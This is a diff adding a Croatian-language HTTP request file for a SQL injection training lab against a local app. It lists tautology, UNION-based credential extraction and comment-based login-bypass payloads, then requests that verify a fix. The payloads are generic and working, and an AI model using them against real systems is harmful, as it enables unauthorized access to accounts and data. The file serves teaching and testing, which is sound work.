@@ -1,0 +1,43 @@
+### =====================================================================
+### Lab07 – A05 Injection: SQL injection (CWE-89)
+### Upute: docs/labs/lab07-sql-injection.md
+### Napomena: payloadi su URL-kodirani (%27 = ', %25 = %, %20 = razmak, %3D = =)
+### =====================================================================
+@host = http://localhost:5080
+
+### 1) Legitimna pretraga – 1 rezultat (Laptop)
+GET {{host}}/api/lab07/products/search?q=Laptop
+
+### 2) Jednostruki navodnik – ranjivo: 400 "Greška u upitu." (signal da se unos umeće u SQL)
+GET {{host}}/api/lab07/products/search?q=%27
+
+### 3) NAPAD: tautologija  ' OR '1'='1' --   → vraća i skriveni "Interni prototip X"
+GET {{host}}/api/lab07/products/search?q=%27%20OR%20%271%27%3D%271%27%20--
+
+### 4) NAPAD: tautologija  %' OR 1=1 --
+GET {{host}}/api/lab07/products/search?q=%25%27%20OR%201%3D1%20--
+
+### 5) NAPAD: UNION  %' UNION SELECT id, username, password, 0 FROM lab07_accounts --
+###    → korisnička imena i lozinke iz druge tablice
+GET {{host}}/api/lab07/products/search?q=%25%27%20UNION%20SELECT%20id%2C%20username%2C%20password%2C%200%20FROM%20lab07_accounts%20--
+
+### 6) Ispravna prijava – 200
+POST {{host}}/api/lab07/login
+Content-Type: application/json
+
+{"username": "admin", "password": "SuperTajna2026"}
+
+### 7) NAPAD: zaobilaženje prijave komentarom  admin'--  (bilo koja lozinka) – ranjivo: 200
+POST {{host}}/api/lab07/login
+Content-Type: application/json
+
+{"username": "admin'--", "password": "bilo-sto"}
+
+### 8) NAPAD: tautologija u lozinci
+POST {{host}}/api/lab07/login
+Content-Type: application/json
+
+{"username": "admin", "password": "' OR '1'='1"}
+
+### 9) PROVJERA POPRAVKA: 3)–5) vraćaju [] (200), 7) i 8) vraćaju 401, a 1) i 6) i dalje rade
+GET {{host}}/api/lab07/products/search?q=%27%20OR%20%271%27%3D%271%27%20--
